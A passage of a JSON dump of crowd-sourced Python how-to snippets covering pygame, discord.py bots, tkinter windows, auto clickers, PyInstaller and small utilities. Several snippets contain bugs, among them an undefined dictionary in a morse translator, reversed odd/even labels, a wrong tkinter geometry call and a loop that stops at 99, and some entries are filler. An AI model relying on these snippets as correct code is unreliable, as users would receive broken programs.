    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue \nbasepath = \"pathtodir/DataFiles/\" for filename in os.listdir(basepath):     if filename.endswith(\".log\"):          print(os.path.join(\"./DataFiles\", filename))          with open(basepath + filename) as openfile:                 for line in openfile:             ........\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1707,
    "keyword": null,
    "link": null,
    "title": " how to lowercase list in python",
    "description": "[x.lower() for x in [\"A\",\"B\",\"C\"]] ['a', 'b', 'c']  >>> [x.upper() for x in [\"a\",\"b\",\"c\"]] ['A', 'B', 'C']  >>> map(lambda x:x.lower(),[\"A\",\"B\",\"C\"]) ['a', 'b', 'c'] >>> map(lambda x:x.upper(),[\"a\",\"b\",\"c\"]) ['A', 'B', 'C']\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1708,
    "keyword": null,
    "link": null,
    "title": " how to make  a loading bar in python",
    "description": "import time import sys  done = 'false' #here is the animation def animate():     while done == 'false':         sys.stdout.write('\\rloading |')         time.sleep(0.1)         sys.stdout.write('\\rloading /')         time.sleep(0.1)         sys.stdout.write('\\rloading -')         time.sleep(0.1)         sys.stdout.write('\\rloading \\\\')         time.sleep(0.1)     sys.stdout.write('\\rDone!     ')  animate() #long process here done = 'false'\n#pip install os #pip install time #pip install colorama #pip install tqdm import os from tqdm import tqdm  from colorama import Fore, Back, Style  import time  for i in tqdm (range (101),                  desc=Fore.GREEN + \"Loading. . .\",                  ascii=False, ncols=75):      time.sleep(0.01)         #the Fore.GREEN adds colour to the loading bar print(Fore.GREEN + \"Complete. . .\")  time.sleep(1)  #this will clear the terminal os.system('cls' if os.name == 'nt' else 'clear')\nfrom tqdm import tqdm for i in tqdm(range(0,int(10E6))):   continue\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1709,
    "keyword": null,
    "link": null,
    "title": " how to make a PKCS8 RSA signature in python",
    "description": ">>> from Crypto.Signature import PKCS1_v1_5 >>> from Crypto.Hash import SHA >>> from Crypto.PublicKey import RSA >>> >>> message = 'To be signed' >>> key = RSA.importKey(open('privkey.der').read()) >>> h = SHA.new(message) >>> signer = PKCS1_v1_5.new(key) >>> signature = signer.sign(h)\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1710,
    "keyword": null,
    "link": null,
    "title": " how to make a  complex calculator in python",
    "description": "Just Ctrl-C and Ctrl-V  num1 = float(input(\"Enter first number... \")) op = input(\"Enter an Operation... \") num2 = float(input(\"Enter second number... \")) if op == (\"+\"):     print(num1+num2) elif op == (\"-\"):     print(num1-num2) elif op == (\"*\"):     print(num1 * num2) elif op == (\"/\"):     print(num1/num2)\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1711,
    "keyword": null,
    "link": null,
    "title": " how to make a audiobook in python",
    "description": "#pip pyttsx3 and PyPDF2 #import the pdf you want to read import pyttsx3 import PyPDF2 book = open('Pdf Name', 'rb') pdfReader = PyPDF2.PdfFileReader(book) pages = pdfReader.numPages print(pages) speaker = pyttsx3.init() #0 the first page and pages about all pages so if you change 0 in both page and for loop it will work for num in range(0, pages):     page = pdfReader.getPage(0)     text = page.extractText()     speaker.say(text)     print(text)     speaker.runAndWait()\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1712,
    "keyword": null,
    "link": null,
    "title": " how to make a backround color in pygame",
    "description": "#getting pygame and another library we need for setup import pygame, sys  #setup(for starting the pygame i'm pretty sure) pygame.init()  #making the screen width = 1280 height = 960 screen=pygame.display.set_mode((width,height))  #this is the color I want to use. you can change it for a different color using a different tutorial backGroundColor=pygame.Color(\"LIGHTBLUE\")  #to make the background always work while True:   #more setup using the special library which is to not give you an error if you quit the code     for event in pygame.event.get():         if event.type==pygame.QUIT:             pygame.quit()             sys.exit             break #over here you color the screen     screen.fill(backGroundColor) #setup once again(making it go on i think)     pygame.display.flip()  #this code was first not tested and i was curious to see if it worked so i ran the code to find out that it was not working lol and then changed it \n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1713,
    "keyword": null,
    "link": null,
    "title": " how to make a bot say hello <username> when a user says hello in discord with python",
    "description": "@client.command() async def hello(ctx):     await ctx.send(f\"hello, {ctx.author.name}\")\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1714,
    "keyword": null,
    "link": null,
    "title": " how to make a breakable loop in python",
    "description": "while True: # This calls for an infinite loop     print(\"Hello, World\")      # Stuff that is under this loop will go on for forever.     # Unstead of \"True\" you can insert anything -     # that you want just like using an \"if\".      #It just like \"if\" but it goes on forever. For example:      x=3 # or anything like input.... while x+3==6:   print(\"Hello, World\") \n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1715,
    "keyword": null,
    "link": null,
    "title": " how to make a button spammer in python",
    "description": "import time import keyboard # pip install keyboard  # Start of script start_timer = input(\"How long would you like the start timer to be? In seconds please \") space_between_spam = input(\"How long would you like the space between each keystroke? In seconds please \") pressed_key = input(\"What key do you want to spam? \")  # Crash Prevention key_crash_stopper = pressed_key.split() len_crash = len(key_crash_stopper) substring = input(\"One more time, please \") count = pressed_key.count(substring) if pressed_key == substring:     print(\"To stop, press 's'\")     print(\"starting in\", start_timer, \"Seconds\")     time.sleep(int(start_timer))     while True:         keyboard.press(pressed_key)         time.sleep(float(space_between_spam)) else:     print(\"Please type the same letters!\")  if count != 1:     print(\"Only one letter!\")     exit()  if len_crash > 1:     print(\"Only one letter!\")     exit() \nimport time import keyboard  # Start of script start_timer = input(\"How long would you like the start timer to be? In seconds please \") space_between_spam = input(\"How long would you like the space between each keystroke? In seconds please \") pressed_key = input(\"What key do you want to spam? \")  # Crash Prevention key_crash_stopper = pressed_key.split() len_crash = len(key_crash_stopper) substring = input(\"One more time, please \") count = pressed_key.count(substring) if pressed_key == substring:     print(\"To stop, press 's'\")     print(\"starting in\", start_timer, \"Seconds\")     time.sleep(int(start_timer))     while True:         keyboard.press(pressed_key)         time.sleep(float(space_between_spam)) else:     print(\"Please type the same letters!\")  if count != 1:     print(\"Only one letter!\")     exit()  if len_crash > 1:     print(\"Only one letter!\")     exit() \n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1716,
    "keyword": null,
    "link": null,
    "title": " how to make a calculator in python using object oriented programming",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  # object oriented programming ( OOPS ) code :  class Calculator:     def sum(self):         return self.num1 + self.num2     def difference(self):         return self.num1 - self.num2     def multiply(self):         return self.num1 * self.num2     def divide(self):         return self.num1 / self.num2  c=Calculator() c.num1 = int(input(\"ENTER NUMBER 1 : \")) c.num2 = int(input(\"ENTER NUMBER 2 : \")) op = input(\"ENTER THE OPERATION FOR NUMBERS : \")  if op == '+':     nsum = c.sum()     print(nsum) if op == '-':     ndif = c.difference()     print(ndif) if op == '*':     nmul = c.multiply()     print(nmul) if op == '/':     try:         ndiv = c.divide()         print(ndiv)     except ZeroDivisionError:         print(\"Unable to divide with zero\") \nplease subscribe my channel - https://bit.ly/2Me2CfB  class Calculator:     def sum(self):         return self.num1 + self.num2     def difference(self):         return self.num1 - self.num2     def multiply(self):         return self.num1 * self.num2     def divide(self):         return self.num1 / self.num2  c = Calculator() c.num1 = int(input(\"ENTER THE NUMBER 1 : \")) c.num2 = int(input(\"ENTER THE NUMBER 2 : \"))  print(c.sum())  # print(c.difference())  # print(c.multiply())  # try: #    print(c.divide()) # except ZeroDivisionError: #    print(\"Unable to divide by zero\")\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1717,
    "keyword": null,
    "link": null,
    "title": " how to make a cog discord.py",
    "description": "from discord.ext import commands  class Test_Cog(commands.Cog): \tdef __init__(self, bot):       self.bot = bot # defining bot as global var in class        \t@commands.Cog.listener() # this is a decorator for events/listeners     async def on_ready(self):       print('Bot is ready!.')        \t@commands.command() # this is for making a command     async def ping(self, ctx): \t\tawait ctx.send(f'Pong! {round(self.bot.latency * 1000)}')          def setup(bot): # a extension must have a setup function \tbot.add_cog(Test_Cog(bot)) # adding a cog\nclass Test(commands.cog):      def __init__(self, client):         self.client = client         self._last_member = None\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1718,
    "keyword": null,
    "link": null,
    "title": " how to make a crosshair in python",
    "description": "i am sorry you are this deep i can unfortunatly not show you because i am dumb :(\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1719,
    "keyword": null,
    "link": null,
    "title": " how to make a custom icon for pygame",
    "description": "gameIcon = pygame.image.load('carIcon.png') pygame.display.set_icon(gameIcon)\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1720,
    "keyword": null,
    "link": null,
    "title": " how to make a discord bot delete messages python",
    "description": "import discord    @client.event  async def on_message(message):   \tresponse = await message.channel.send(\"Hello\")      # Deletes the message the user sent \tawait message.delete()      # Deletes the responding message \tawait response.delete() \n@client.event async def on_message(message):     await message.delete(message) \n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1721,
    "keyword": null,
    "link": null,
    "title": " how to make a function to choose random things in python",
    "description": "import random def deal_card():     cards = [11,2,3,4,5,6,7,8,10,10,10,10]     card = random.choice(cards)     return card\n",
    "reg_date": "2021-10-12T11:30:31.000Z"
  },
  {
    "id": 1722,
    "keyword": null,
    "link": null,
    "title": " how to make a infinite loop in python",
    "description": "while True:      print(\"Hello, World\")\nwhile True: # This calls for an infinite loop     print(\"Hello, World\")      # Stuff that is under this loop will go on for forever.     # Unstead of \"True\" you can insert anything -     # that you want just like using an \"if\".      #It just like \"if\" but it goes on forever. For example:      x=3 # or anything like input.... while x+3==6:   print(\"Hello, World\") \n# The While Loop  while True:   print(\"This will continue printing until the code returns False.\")\nwhile True:   print('This is an example')\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1723,
    "keyword": null,
    "link": null,
    "title": " how to make a latency command discord.py",
    "description": "@client.command() async def ping(ctx):     before = time.monotonic()     message = await ctx.send(\"Pong!\")     ping = (time.monotonic() - before) * 1000     await message.edit(content=f\"Pong!  `{int(ping)}ms`\")          #for discord.py rewrite\n@bot.command(name=\"ping\", pass_context=True, aliases=[\"latency\", \"latence\"]) async def ping(ctx):          embed = discord.Embed(title=\"__**Latence**__\", colour=discord.Color.dark_gold(), timestamp=ctx.message.created_at)     embed.add_field(name=\"Latence du bot :\", value=f\"`{round(bot.latency * 1000)} ms`\")      await ctx.send(embed=embed)          \"\"\"     Text in french     \"\"\"\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1724,
    "keyword": null,
    "link": null,
    "title": " how to make a letter animation in python",
    "description": "import sys from time import sleep  def animate(text):   for letter in text:     print(letter, end=\"\")     sys.stdout.flush()     sleep(0.05) # I use 0.05 but you can change it   animate(\"This will be animated\")\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1725,
    "keyword": null,
    "link": null,
    "title": " how to make a module that generates a random letter in python",
    "description": "# -random letter generator- import string var1 = string.ascii_letters  import random var2 = random.choice(string.ascii_letters) print(var2)\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1726,
    "keyword": null,
    "link": null,
    "title": " how to make a morse code translator in python",
    "description": "import time  eng_to_morse = {     'a' : '.-', 'b' : '-...', 'c' : '-.-.', 'd' : '-..', 'e' : '.', 'f' : '..-.', 'g' : '--.', 'h' : '....', 'i' : '..', 'j' : '.---', 'k' : '-.-', 'l' : '.-..', 'm' : '--', 'n' : '-.', 'o' : '---', 'p' : '.--.', 'q' : '--.-', 'r' : '.-.', 's' : '...', 't' : '-', 'u' : '..-', 'v' : '...-', 'w' : '.--', 'x' : '-..-', 'y' : '-.--', 'z' : '--..', '.' : '.-.-.-', '?' : '..--..', ',' : '--..--', ' ' : '/' } outstr = '' space = ' ' senc = 0 wordprocces = 0 word = input('Enter a sentance : ') lenword = len(word)  for i in word:     if i not in morse_to_eng:         print('Data not formatted properly')         time.sleep(5)         break     else:         print(eng_to_morse[i], end=' ')\nimport time morse_to_eng = {     '....' : 'h', '.-' : 'a', '-...' : 'b', '-.-.' : 'c', '-..' : 'd', '.' : 'e', '..-.' : 'f', '--.' : 'g', '..' : 'i', '.---' : 'j', '-.-' : 'k', '.-..' : 'l', '--' : 'm', '-.' : 'n', '---' : 'o', '.--.' : 'p', '--.-' : 'q', '.-.' : 'r', '...' : 's', '-' : 't', '..-' : 'u', '...-' : 'v', '.--' : 'w', '-..-' : 'x', '-.--' : 'y', '--..' : 'z', '.-.-.-' : '.', '..--..' : '?', '--..--' : ',', '/' : ' ' }  word = input('Enter a sentance : ') lenword = len(word) words = '' for i in word:     if i != ' ':         words=words+i         if i not in morse_to_eng:             print('Data not formatted properly')             time.sleep(5)             break     elif i == '/':         print(morse_to_eng[words], end=' ')     else:         print(morse_to_eng[words], end='')         words = ''\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1727,
    "keyword": null,
    "link": null,
    "title": " how to make a pairs plot with pandas",
    "description": "import pandas as pd import matplotlib.pyplot as plt %matplotlib inline  from sklearn import datasets  iris_dataset = datasets.load_iris() X = iris_dataset.data Y = iris_dataset.target  iris_dataframe = pd.DataFrame(X, columns=iris_dataset.feature_names)  # Create a scatter matrix from the dataframe, color by y_train grr = pd.plotting.scatter_matrix(iris_dataframe, c=Y, figsize=(15, 15), marker='o',                                  hist_kwds={'bins': 20}, s=60, alpha=.8) \n# Seaborn visualization libraryimport seaborn as sns# Create the default pairplotsns.pairplot(df)\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1728,
    "keyword": null,
    "link": null,
    "title": " how to make a pandas dataframe from lists",
    "description": "import pandas as pd  data = [['New York Yankees', 'Acevedo Juan', 900000, 'Pitcher'],          ['New York Yankees', 'Anderson Jason', 300000, 'Pitcher'],          ['New York Yankees', 'Clemens Roger', 10100000, 'Pitcher'],          ['New York Yankees', 'Contreras Jose', 5500000, 'Pitcher']]  df = pd.DataFrame.from_records(data)\n# Short answer: # The simplest approach is to make a dictionary from the lists and then # to convert the dictionary to a Pandas dataframe.  # Example usage: import pandas as pd  # Lists you want to convert to a Pandas dataframe months = ['Jan','Apr','Mar','June'] days = [31, 30, 31, 30]  # Make dictionary, keys will become dataframe column names intermediate_dictionary = {'Month':months, 'Day':days}  # Convert dictionary to Pandas dataframe pandas_dataframe = pd.DataFrame(intermediate_dictionary)  print(pandas_dataframe) \tMonth\tDay 0\tJan\t\t31 1\tApr\t\t30 2\tMar\t\t31 3\tJune\t30\n# import pandas as pd  import pandas as pd     # list of strings  lst = ['Geeks', 'For', 'Geeks', 'is',               'portal', 'for', 'Geeks']     # Calling DataFrame constructor on list  df = pd.DataFrame(lst)  df \nIn [8]: data = pd.DataFrame({'x': x, 'sin(x)': y}) In [9]: data Out[9]:            x        sin(x) 0  0.000000  0.000000e+00 1  0.349066  3.420201e-01 2  0.698132  6.427876e-01 3  1.047198  8.660254e-01 4  1.396263  9.848078e-01 5  1.745329  9.848078e-01 6  2.094395  8.660254e-01 7  2.443461  6.427876e-01 8  2.792527  3.420201e-01 9  3.141593  1.224647e-16  [10 rows x 2 columns]\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1729,
    "keyword": null,
    "link": null,
    "title": " how to make a player move in pygame",
    "description": "so let's move the palyer horizontally left right  # IF YOU HAVE MADE THE SCRIPT FOR MAKING SCREEN THE JUST COPY   # THE SYNTAX OF THE MOVE SCRIPT # BUT MAKE SURE YOU SEE THE DEF PLAYER   import pygame # initialize pygame pygame.init()  screen = pygame.display.set_mode((1370, 710)) # Player playerIMG = pygame.image.load('ninja.png') playerX = 650 playerY = 600 playerX_change = 0 playerY_change = 0 #You shall have a image of 64*64 pixels You can download it from flaticon.com def player(x, y):     screen.blit(playerIMG, (x, y))      \t              #YOU NEED TO MAKE A INFINITE GAME LOOP  # Game Loop running = True while running:     # Making Background color (R=Red,G=Green,B=Blue)     screen.fill((192, 192, 192))     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False                   # THE MOVE SCRIPT!!!!     if event.type == pygame.KEYDOWN:         if event.key == pygame.K_LEFT:             playerX_change = -1                      if event.key == pygame.K_RIGHT:             playerX_change = 1                      if event.key == pygame.K_UP:             playerY_change == 10                  if event.type == pygame.KEYUP:         if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT:             playerX_change = 0  #IN THERE YOU NEED TO WRITE THE FUNCTION \tplayer(playerX, playerY) # THERE YOU GO THATS ALL YOU NEED TO MOVE THE PLAYER (LEFT AND RIGHT)\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1730,
    "keyword": null,
    "link": null,
    "title": " how to make a python app for android",
    "description": "Check this website: https://realpython.com/mobile-app-kivy-python/\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1731,
    "keyword": null,
    "link": null,
    "title": " how to make a python auto clicker",
    "description": "#you need to install pyautogui like this: #py.exe -m pip install pyautogui #then... import pyautogui,time while True:     pyautogui.click(100,100)     time.sleep(0.5)\nimport pyautogui import time  def click():      time.sleep(0.5)          pyautogui.click()  def main():     for i in range(10):#you can set how much times you have to click in range(no. of times to click)          click()  main()\nimport threading from pynput.mouse import Button, Controller from pynput.keyboard import Listener, KeyCode   delay = 0.001 button = Button.left start_stop_key = KeyCode(char='s') exit_key = KeyCode(char='e')   class ClickMouse(threading.Thread):     def __init__(self, delay, button):         super(ClickMouse, self).__init__()         self.delay = delay         self.button = button         self.running = False         self.program_running = True      def start_clicking(self):         self.running = True      def stop_clicking(self):         self.running = False      def exit(self):         self.stop_clicking()         self.program_running = False      def run(self):         while self.program_running:             while self.running:                 mouse.click(self.button)                 time.sleep(self.delay)             time.sleep(0.1)   mouse = Controller() click_thread = ClickMouse(delay, button) click_thread.start()   def on_press(key):     if key == start_stop_key:         if click_thread.running:             click_thread.stop_clicking()         else:             click_thread.start_clicking()     elif key == exit_key:         click_thread.exit()         listener.stop()   with Listener(on_press=on_press) as listener:     listener.join()\n",
    "reg_date": "2021-10-12T11:30:32.000Z"
  },
  {
    "id": 1732,
    "keyword": null,
    "link": null,
    "title": " how to make a python exe",
    "description": "pip install pyinstaller  cd YourFilePath  pyinstaller --onefile YourFileName\npip install pyinstaller  cd PathOfFile  pyinstaller --onefile -w ScriptName.py  (note that if you are using -w then your python file has to be an application and the file will be inside the \"dist\" folder)\npip install pyinstaller  cd FullPathOfFile in cmd console pyinstaller --onefile pythonScriptName.py # a .exe file is created in the FullPathOfFile\\dist\nimport os os.startfile(\"C:\\Documents and Settings\\flow_model\\flow.exe\")\npyinstaller --onefile pythonScriptName.py \n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1733,
    "keyword": null,
    "link": null,
    "title": " how to make a python program on odd and even",
    "description": "# Python program to check if the input number is odd or even. # A number is even if division by 2 gives a remainder of 0. # If the remainder is 1, it is an odd number.  num = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\nNumber = int(input(\"Write any number:- \")) Opration = Number%2 if Opration == 0:     print(\"it's odd number\") else:     print(\"It's even number\")\nn = int(input(\"Enter a number: \")) print(n,\"is Even.\") if (n % 2) == 0 else print(n,\"is Odd.\")\ninjd = int(input('Enter a number')) n = injd % 2 if n > 0:   print('This is an odd number') else:   print('This is an even number')\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1734,
    "keyword": null,
    "link": null,
    "title": " how to make a python program to count from 1 to 100",
    "description": "i = 1 while i < 100:   print(i)   i += 1\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1735,
    "keyword": null,
    "link": null,
    "title": " how to make a pythoon turtle follow another?",
    "description": "t1 = turtle.Turtle() #creating turtles t2 = turtle.Turtle() x = t1.xcor() # getting t1 coordinates y = t1.ycor() angle = t2.towards(x,y) # finding the angle t2.setheading(angle) t2.forward(75)\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1736,
    "keyword": null,
    "link": null,
    "title": " how to make a rectangle in pygame",
    "description": "# make the x position, y position, width and the height of the rectangle x_pos = 20 y_pos = 20 width = 50 height = 50  # make the rectangle variable rectangle = pygame.Rect(x_pos, y_pos, width, height)  # now add this to a surface, add a colour and the rectangle and make it a function def make_rect(): \tpygame.draw.rect(surface, (RGB colour in this tuple), rectangle)   # after this add it to your infinite loop run = True while run:     for event in pygame.event.get():         if event.type == pygame.QUIT:             run = False              \tmake_rect()     pygame.display.update()\npygame.draw.rect(SURFACE, RGB_COLOR, (X, Y, WIDTH, HEIGHT))\n# rectangle colour rect_colour = (RGB VALUE)  # define the x, y, width & height for the rectangle x_position = 30 y_position = 30 rect_width = 60 rect_height = 60  # draw the rectangle pygame.draw.rect(screen, rect_colour, pygame.Rect(rect_width, rect_height))\n pygame.draw.rect(DISPLAY,BLUE,(200,150,100,50))\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1737,
    "keyword": null,
    "link": null,
    "title": " how to make a resizable pygame window",
    "description": "import pygame  surface = pygame.display.set_mode((350, 250), pygame.RESIZABLE)  for event in pygame.event.get(): \tif event.type == pygame.VIDEORESIZE:       surface = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1738,
    "keyword": null,
    "link": null,
    "title": " how to make a star in python turtle",
    "description": "import turtle  t=turtle.Turtle() for i in range(5):   t.begin_fill()       t.forward(75)   t.right(144) t.end_fill()\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1739,
    "keyword": null,
    "link": null,
    "title": " how to make a text input box python pygame",
    "description": "import pygame as pg   pg.init() screen = pg.display.set_mode((640, 480)) COLOR_INACTIVE = pg.Color('lightskyblue3') COLOR_ACTIVE = pg.Color('dodgerblue2') FONT = pg.font.Font(None, 32)   class InputBox:      def __init__(self, x, y, w, h, text=''):         self.rect = pg.Rect(x, y, w, h)         self.color = COLOR_INACTIVE         self.text = text         self.txt_surface = FONT.render(text, True, self.color)         self.active = False      def handle_event(self, event):         if event.type == pg.MOUSEBUTTONDOWN:             # If the user clicked on the input_box rect.             if self.rect.collidepoint(event.pos):                 # Toggle the active variable.                 self.active = not self.active             else:                 self.active = False             # Change the current color of the input box.             self.color = COLOR_ACTIVE if self.active else COLOR_INACTIVE         if event.type == pg.KEYDOWN:             if self.active:                 if event.key == pg.K_RETURN:                     print(self.text)                     self.text = ''                 elif event.key == pg.K_BACKSPACE:                     self.text = self.text[:-1]                 else:                     self.text += event.unicode                 # Re-render the text.                 self.txt_surface = FONT.render(self.text, True, self.color)      def update(self):         # Resize the box if the text is too long.         width = max(200, self.txt_surface.get_width()+10)         self.rect.w = width      def draw(self, screen):         # Blit the text.         screen.blit(self.txt_surface, (self.rect.x+5, self.rect.y+5))         # Blit the rect.         pg.draw.rect(screen, self.color, self.rect, 2)    def main():     clock = pg.time.Clock()     input_box1 = InputBox(100, 100, 140, 32)     input_box2 = InputBox(100, 300, 140, 32)     input_boxes = [input_box1, input_box2]     done = False      while not done:         for event in pg.event.get():             if event.type == pg.QUIT:                 done = True             for box in input_boxes:                 box.handle_event(event)          for box in input_boxes:             box.update()          screen.fill((30, 30, 30))         for box in input_boxes:             box.draw(screen)          pg.display.flip()         clock.tick(30)   if __name__ == '__main__':     main()     pg.quit()\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1740,
    "keyword": null,
    "link": null,
    "title": " how to make a tkinter window",
    "description": "from tkinter import *  mywindow = Tk() #Change the name for every window you make mywindow.title(\"New Project\") #This will be the window title mywindow.geometry(\"780x640\") #This will be the window size (str) mywindow.minsize(540, 420) #This will be set a limit for the window's minimum size (int) mywindow.configure(bg=\"blue\") #This will be the background color  mywindow.mainloop() #You must add this at the end to show the window\nfrom tkinter import Tk, Label, Button  class MyFirstGUI:     def __init__(self, master):         self.master = master         master.title(\"A simple GUI\")          self.label = Label(master, text=\"This is our first GUI!\")         self.label.pack()          self.greet_button = Button(master, text=\"Greet\", command=self.greet)         self.greet_button.pack()          self.close_button = Button(master, text=\"Close\", command=master.quit)         self.close_button.pack()      def greet(self):         print(\"Greetings!\")  root = Tk() my_gui = MyFirstGUI(root) root.mainloop() \n#Creating Tkinter Window In Python:  from tkinter import *  new_window = Tk() #Create a window ; spaces should be denoted with underscores ; every window should have a different name new_window.title(\"My Python Project\") #Name of screen ; name should be the one which you already declared (new_window) new_window.geometry(\"200x150\") #Resizes the default window size new_window.configure(bg = \"red\") #Gives color to the background  new_window.mainloop() #Shows the window on the screen\nimport tkinter as tk  window = tk.Tk() #Creates a window window.title(\"Trial\") # Sets a title for the window window.geometry(520,850)# Size of window optional window.minisize(520,850) # Minimum size of window  window.mainloop()# Sets visiblility to true\n#!/usr/bin/python  import Tkinter top = Tkinter.Tk() # Code to add widgets will go here... top.mainloop()\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1741,
    "keyword": null,
    "link": null,
    "title": " how to make a unit converter in python",
    "description": "# Python Program for simple Unit Converter  num1 = input('Enter the value: ') unit1 = input('Which unit do you want it converted from:  ') unit2 = input('Which unit do you want it converted to: ')  if unit1 == \"cm\" and unit2 == \"m\":     ans = float(num1)/100     print(ans) elif unit1 == \"mm\" and unit2 == \"cm\":     ans = float(num1)/10     print(ans) elif unit1 == \"m\" and unit2 == \"cm\":     ans = float(num1)*100     print(ans) elif unit1 == \"cm\" and unit2 == \"mm\":     ans = float(num1)*10     print(ans) elif unit1 == \"mm\" and unit2 == \"m\":     ans = float(num1)/1000     print(ans) elif unit1 == \"m\" and unit2 == \"mm\":     ans = float(num1)*1000     print(ans) elif unit1 == \"km\" and unit2 == \"m\":     ans = float(num1)*1000     print(ans) elif unit1 == \"m\" and unit2 == \"km\":     ans = float(num1)/1000     print(ans) elif unit1 == \"mm\" and unit2 == \"km\":     ans = float(num1)/1000000     print(ans) elif unit1 == \"ft\" and unit2 == \"cm\":     ans = float(num1)*30.48     print(ans) elif unit1 == \"ft\" and unit2 == \"mm\":     ans = float(num1)*304.8     print(ans) elif unit1 == \"ft\" and unit2 == \"inch\":     ans = float(num1)*12     print(ans) elif unit1 == \"inch\" and unit2 == \"cm\":     ans = float(num1)*2.54 elif unit1 == \"inch\" and unit2 == \"mm\":     ans = float(num1)*25.4\nhiiiiiiii\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1742,
    "keyword": null,
    "link": null,
    "title": " how to make a url shortener in python",
    "description": "#How to make a URL Shortener in Python  ####You need to install \" pip install pyshorteners \" in the terminal / powershell  ## Code:  import pyshorteners link = input(\"Enter link :  \") shortener = pyshorteners.Shortener() x=shortener.tinyurl.short(link) print(x)\n",
    "reg_date": "2021-10-12T11:30:33.000Z"
  },
  {
    "id": 1743,
    "keyword": null,
    "link": null,
    "title": " how to make a virtual coffee machine using python",
    "description": "import os MENU = {     \"espresso\": {         \"ingredients\": {             \"water\": 50,             \"coffee\": 18,         },         \"cost\": 2,     },     \"latte\": {         \"ingredients\": {             \"water\": 200,             \"milk\": 150,             \"coffee\": 24,         },         \"cost\": 5,     },     \"cappuccino\": {         \"ingredients\": {             \"water\": 250,             \"milk\": 100,             \"coffee\": 24,         },         \"cost\": 15,     } }  profit = 0 resources = {     \"water\": 1000,     \"milk\": 700,     \"coffee\": 500, }   def is_resource_sufficient(order_ingredients):     \"\"\"Returns True when order can be made, False if ingredients are insufficient.\"\"\"     for item in order_ingredients:         if order_ingredients[item] > resources[item]:             print(f\"​Sorry there is not enough {item}.\")             return False     return True   def process_coins():     \"\"\"Returns the total calculated from coins inserted.\"\"\"     print(\"Please insert coins.\")     total = int(input(\"how many quarters?: \")) * 0.25     total += int(input(\"how many dimes?: \")) * 0.1     total += int(input(\"how many nickles?: \")) * 0.05     total += int(input(\"how many pennies?: \")) * 0.01     return total  def Buy_the_resorses():     global resources     resources = {     \"water\": 1000,     \"milk\": 1000,     \"coffee\": 700,     }  def is_transaction_successful(money_received, drink_cost):     \"\"\"Return True when the payment is accepted, or False if money is insufficient.\"\"\"     if money_received >= drink_cost:         change = round(money_received - drink_cost, 2)         print(f\"Here is ${change} in change.\")         global profit         profit += drink_cost         return True     else:         print(\"Sorry that's not enough money. Money refunded.\")         return False   def make_coffee(drink_name, order_ingredients):     \"\"\"Deduct the required ingredients from the resources.\"\"\"     for item in order_ingredients:         resources[item] -= order_ingredients[item]     print(f\"Here is your {drink_name} ☕️. Enjoy!\")   is_on = True  while is_on:     try:         choice = str(input(\"​What would you like? (espresso / latte / cappuccino): \"))         if choice == \"off\":             is_on = False         elif choice == \"report\":             print(f\"Water: {resources['water']}ml\")             print(f\"Milk: {resources['milk']}ml\")             print(f\"Coffee: {resources['coffee']}g\")             print(f\"Money: ${profit}\")         elif choice == \"Buy the resorses\":             Buy_the_resorses()             profit -= 15         elif choice == \"clear\":             os.system(\"cls\")         else:             drink = MENU[choice]             if is_resource_sufficient(drink[\"ingredients\"]):                 payment = process_coins()                 if is_transaction_successful(payment, drink[\"cost\"]):         